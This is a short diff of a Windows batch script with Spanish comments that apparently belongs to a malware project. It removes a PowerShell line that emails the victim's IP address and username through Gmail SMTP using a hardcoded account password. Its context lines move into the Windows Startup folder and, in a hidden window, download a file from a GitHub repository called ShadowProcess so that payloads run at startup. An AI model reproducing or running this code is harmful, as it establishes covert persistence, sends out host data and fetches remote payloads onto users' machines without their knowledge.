@@ -10,8 +10,6 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 @REM Dirigirse al direcrotio del inicio de windows.
 cd  %STARTUP%
 
-powershell $email = "robertogonzalez6662@gmail.com"; $password = "BobEsponja123$!"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com","587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email,$password); $smtp.Send($email, $email, $subject, $ip);
-
 @REM Ejecutar payloads al inicio.
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
 
